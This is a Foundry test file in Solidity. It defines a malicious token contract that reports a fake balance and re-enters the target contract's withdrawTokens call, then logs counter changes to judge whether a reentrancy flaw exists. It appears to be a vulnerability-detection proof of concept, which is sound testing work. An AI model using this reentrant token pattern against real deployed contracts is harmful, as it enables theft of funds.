// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol";

contract MaliciousToken is Token {
    EtherGet public victim;
    bool public reentered;
    uint256 private constant FAKE_BALANCE = 100 ether;

    constructor(address _victim) {
        victim = EtherGet(_victim);
    }

    function balanceOf(address _owner) external view override returns (uint256 balance) {
        return _owner == address(victim) ? FAKE_BALANCE : 0;
    }

    function transfer(address, uint256) external override returns (bool) {
        if (!reentered) {
            reentered = true;
            victim.withdrawTokens(address(this));
        }
        return true;
    }
}

contract EtherGetTest is Test {
    EtherGet public etherGet;
    MaliciousToken public maliciousToken;
    address owner = makeAddr("owner");

    function setUp() public {
        vm.prank(owner);
        etherGet = new EtherGet();
        maliciousToken = new MaliciousToken(address(etherGet));
    }

    function testReentrancy() public {
        console2.log("--- BEFORE-Trigger State ---");
        uint256 beforeOperations = etherGet.totalTokenOperations();
        uint256 beforeWithdrawalCount = etherGet.tokenWithdrawalCount(address(maliciousToken));
        console2.log("Initial totalTokenOperations:", beforeOperations);
        console2.log("Initial tokenWithdrawalCount for maliciousToken:", beforeWithdrawalCount);
        
        console2.log("--- Trigger Reentrancy ---");
        vm.prank(owner);
        etherGet.withdrawTokens(address(maliciousToken));
        
        console2.log("--- AFTER-Trigger State ---");
        uint256 afterOperations = etherGet.totalTokenOperations();
        uint256 afterWithdrawalCount = etherGet.tokenWithdrawalCount(address(maliciousToken));
        console2.log("Updated totalTokenOperations:", afterOperations);
        console2.log("Updated tokenWithdrawalCount for maliciousToken:", afterWithdrawalCount);
        
        uint256 operationsDiff = afterOperations - beforeOperations;
        uint256 withdrawalCountDiff = afterWithdrawalCount - beforeWithdrawalCount;
        console2.log("State change in totalTokenOperations:", operationsDiff);
        console2.log("State change in tokenWithdrawalCount:", withdrawalCountDiff);
        
        bool operationsOverflowed = operationsDiff > 1;
        bool withdrawalsOverflowed = withdrawalCountDiff > 1;
        
        // Final vulnerability evaluation
        if (operationsOverflowed || withdrawalsOverflowed) {
            string memory reason = "State variables increased by more than 1, indicating reentrant call";
            console2.log("Vulnerability Exists:", reason);
        } else {
            string memory reason = "No unexpected state changes detected";
            console2.log("Vulnerability not Exist:", reason);
        }
    }
}